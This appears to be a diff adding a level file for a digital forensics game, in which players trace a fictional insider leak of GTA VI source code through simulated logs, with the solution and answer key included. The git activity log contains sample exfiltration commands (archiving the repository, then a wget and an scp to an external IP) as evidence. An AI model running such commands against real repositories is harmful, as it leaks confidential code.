@@ -1,0 +1,87 @@
+{
+  "id": "level-1",
+  "title": "GTA VI Source Code Leak",
+  "difficulty": "Beginner",
+  "category": "Digital Forensics",
+  "description": "Someone leaked the highly anticipated GTA VI source code! Help Rockstar Games track down the culprit.",
+  "scenario": {
+    "briefing": "URGENT: Grand Theft Auto VI source code has been leaked online! Rockstar Games needs you to investigate how this happened. The leak appeared on various forums and file-sharing sites. You need to trace the digital footprints and find the insider responsible.",
+    "objective": "Identify the source of the GTA VI leak by analyzing system logs, employee access records, and network activity",
+    "timeLimit": 900,
+    "maxHints": 3
+  },
+  "environment": {
+    "serverName": "rockstar-internal",
+    "osType": "Linux",
+    "availableCommands": ["ls", "cat", "cd", "pwd", "grep", "find", "head", "tail", "whoami", "help", "clear"],
+    "fileSystem": {
+      "/home/detective": {
+        "type": "directory",
+        "children": {
+          "mission.txt": {
+            "type": "file",
+            "content": "ROCKSTAR GAMES SECURITY INCIDENT REPORT\n==========================================\n\nINCIDENT: Unauthorized disclosure of GTA VI source code\nDATE: 2024-12-15\nPRIORITY: CRITICAL\n\nSITUATION:\nApproximately 90 lines of Grand Theft Auto VI source code were leaked online and posted to various gaming forums. The leaked code includes early gameplay mechanics and unreleased features.\n\nYOUR MISSION:\n1. Investigate system access logs to identify suspicious activity\n2. Analyze employee access patterns for unusual behavior\n3. Examine git repository activity for unauthorized downloads\n4. Identify the insider responsible for the leak\n\nFILES AVAILABLE:\n- /logs/access.log - System access records\n- /logs/employee_access.log - Employee badge access data\n- /logs/git_activity.log - Source code repository activity\n- /evidence/ - Investigation evidence folder\n\nRemember: Look for patterns, timing anomalies, and cross-reference activities."
+          }
+        }
+      },
+      "/logs": {
+        "type": "directory",
+        "children": {
+          "access.log": {
+            "type": "file",
+            "content": "2024-12-15 08:45:23 [INFO] User sarah.johnson logged in from 192.168.1.45\n2024-12-15 09:12:34 [INFO] User mike.chen logged in from 192.168.1.67\n2024-12-15 09:45:12 [INFO] User alice.rodriguez logged in from 192.168.1.23\n2024-12-15 10:30:45 [INFO] User marcus.wright logged in from 192.168.1.89\n2024-12-15 11:15:56 [INFO] User david.kim logged in from 192.168.1.12\n2024-12-15 23:47:33 [WARNING] User marcus.wright logged in from 203.142.75.88\n2024-12-15 23:52:17 [INFO] Failed login attempt for admin from 203.142.75.88\n2024-12-15 23:58:42 [WARNING] Unusual VPN connection detected from 203.142.75.88\n2024-12-16 00:15:23 [INFO] User marcus.wright logged out\n2024-12-16 08:30:12 [INFO] User sarah.johnson logged in from 192.168.1.45"
+          },
+          "employee_access.log": {
+            "type": "file",
+            "content": "ROCKSTAR GAMES - EMPLOYEE BADGE ACCESS LOG\n==========================================\n\n2024-12-15 08:44:12 | SARAH JOHNSON | Badge: 1245 | Entrance: Main Door | Floor: 3\n2024-12-15 09:11:45 | MIKE CHEN | Badge: 1367 | Entrance: Main Door | Floor: 2\n2024-12-15 09:44:23 | ALICE RODRIGUEZ | Badge: 1489 | Entrance: Main Door | Floor: 4\n2024-12-15 10:29:34 | MARCUS WRIGHT | Badge: 1523 | Entrance: Main Door | Floor: 5\n2024-12-15 10:35:17 | MARCUS WRIGHT | Badge: 1523 | Entrance: Server Room | Floor: 5\n2024-12-15 11:14:56 | DAVID KIM | Badge: 1601 | Entrance: Main Door | Floor: 1\n2024-12-15 18:45:23 | SARAH JOHNSON | Badge: 1245 | Exit: Main Door\n2024-12-15 19:12:34 | MIKE CHEN | Badge: 1367 | Exit: Main Door\n2024-12-15 19:30:45 | ALICE RODRIGUEZ | Badge: 1489 | Exit: Main Door\n2024-12-15 20:15:12 | DAVID KIM | Badge: 1601 | Exit: Main Door\n2024-12-15 23:45:17 | MARCUS WRIGHT | Badge: 1523 | Entrance: Server Room | Floor: 5\n2024-12-16 00:12:34 | MARCUS WRIGHT | Badge: 1523 | Exit: Main Door"
+          },
+          "git_activity.log": {
+            "type": "file",
+            "content": "GIT REPOSITORY ACTIVITY LOG - GTA VI PROJECT\n===========================================\n\n2024-12-15 09:15:23 | sarah.johnson | git pull origin main | Branch: feature/vehicle-physics\n2024-12-15 09:30:45 | mike.chen | git commit -m 'Updated AI pathfinding' | Branch: feature/npc-ai\n2024-12-15 10:45:12 | alice.rodriguez | git push origin feature/map-editor | Branch: feature/map-editor\n2024-12-15 11:20:34 | david.kim | git pull origin main | Branch: bugfix/memory-leak\n2024-12-15 11:35:56 | marcus.wright | git clone https://internal.rockstar.com/gtavi.git | Branch: main\n2024-12-15 23:50:17 | marcus.wright | git clone https://internal.rockstar.com/gtavi.git | Branch: main\n2024-12-15 23:52:43 | marcus.wright | git archive --format=zip HEAD > gtavi_source.zip | Branch: main\n2024-12-15 23:55:12 | marcus.wright | wget https://file-sharing.site/upload | External Command\n2024-12-15 23:57:34 | marcus.wright | scp gtavi_source.zip external@203.142.75.88:/uploads/ | External Transfer\n2024-12-16 08:31:23 | sarah.johnson | git pull origin main | Branch: feature/vehicle-physics"
+          }
+        }
+      },
+      "/evidence": {
+        "type": "directory",
+        "children": {
+          "timeline.txt": {
+            "type": "file",
+            "content": "INVESTIGATION TIMELINE\n=====================\n\n2024-12-15 Timeline Analysis:\n\n10:29 AM - Marcus Wright enters building (normal work hours)\n10:35 AM - Marcus Wright accesses server room (legitimate access)\n11:35 AM - Marcus Wright clones git repository (normal development activity)\n\n8:00 PM - All other employees have left the building\n\n11:45 PM - Marcus Wright re-enters server room (SUSPICIOUS - after hours)\n11:47 PM - Marcus Wright logs in remotely via VPN from external IP\n11:50 PM - Marcus Wright clones git repository again (SUSPICIOUS - duplicate clone)\n11:52 PM - Marcus Wright creates zip archive of entire source code\n11:55 PM - External file upload activity detected\n11:57 PM - File transfer to external server detected\n\n12:12 AM - Marcus Wright exits building\n\nCONCLUSION: Clear pattern of data exfiltration after normal business hours."
+          },
+          "ip_analysis.txt": {
+            "type": "file",
+            "content": "IP ADDRESS ANALYSIS\n==================\n\nSuspicious IP: 203.142.75.88\n\nWHOIS Information:\n- Location: Unknown (VPN/Proxy)\n- ISP: Private VPN Service\n- First seen: 2024-12-15 23:47:33\n- Activities:\n  * Remote login attempts\n  * File upload connections\n  * Data exfiltration\n\nInternal IP Correlation:\n- 192.168.1.89 (Marcus Wright's workstation)\n- Connection pattern suggests same user\n- VPN used to mask external activities\n\nRECOMMENDATION: IP 203.142.75.88 should be blocked and investigated further."
+          },
+          "conclusion.txt": {
+            "type": "file",
+            "content": "INVESTIGATION CONCLUSION\n=======================\n\nCULPRIT IDENTIFIED: Marcus Wright (Employee Badge: 1523)\n\nEVIDENCE SUMMARY:\n✓ Accessed server room after normal hours (11:45 PM)\n✓ Used VPN to mask external IP address (203.142.75.88)\n✓ Cloned git repository outside normal workflow\n✓ Created unauthorized zip archive of source code\n✓ Transferred files to external server\n✓ Timeline shows deliberate data exfiltration pattern\n\nRECOMMENDED ACTIONS:\n1. Immediately revoke Marcus Wright's access credentials\n2. Disable badge 1523 and escort from premises\n3. Contact legal team for potential criminal charges\n4. Implement additional monitoring for source code access\n5. Review and strengthen data loss prevention policies\n\nCASE STATUS: SOLVED\nINVESTIGATOR: Detective [Your Username]\nDATE: 2024-12-15\n\n--- MISSION ACCOMPLISHED ---"
+          }
+        }
+      }
+    },
+    "specialCommands": {
+      "cat /evidence/conclusion.txt": {
+        "output": "INVESTIGATION CONCLUSION\n=======================\n\nCULPRIT IDENTIFIED: Marcus Wright (Employee Badge: 1523)\n\nEVIDENCE SUMMARY:\n✓ Accessed server room after normal hours (11:45 PM)\n✓ Used VPN to mask external IP address (203.142.75.88)\n✓ Cloned git repository outside normal workflow\n✓ Created unauthorized zip archive of source code\n✓ Transferred files to external server\n✓ Timeline shows deliberate data exfiltration pattern\n\nRECOMMENDED ACTIONS:\n1. Immediately revoke Marcus Wright's access credentials\n2. Disable badge 1523 and escort from premises\n3. Contact legal team for potential criminal charges\n4. Implement additional monitoring for source code access\n5. Review and strengthen data loss prevention policies\n\nCASE STATUS: SOLVED\nINVESTIGATOR: Detective [Your Username]\nDATE: 2024-12-15\n\n--- MISSION ACCOMPLISHED ---",
+        "action": "complete_level"
+      }
+    }
+  },
+  "solution": {
+    "steps": [
+      "Read mission briefing with 'cat mission.txt'",
+      "Check system logs with 'ls /logs' and 'cat /logs/access.log'",
+      "Analyze employee access with 'cat /logs/employee_access.log'",
+      "Examine git activity with 'cat /logs/git_activity.log'",
+      "Review evidence files in /evidence/ directory",
+      "Read conclusion with 'cat /evidence/conclusion.txt'"
+    ],
+    "finalAnswer": "Marcus Wright",
+    "explanation": "Marcus Wright was identified as the insider who leaked the GTA VI source code based on after-hours access, VPN usage, and unauthorized file transfers."
+  },
+  "scoring": {
+    "maxScore": 1000,
+    "timeBonus": 200,
+    "hintPenalty": 50,
+    "wrongCommandPenalty": 10
+  }
+}
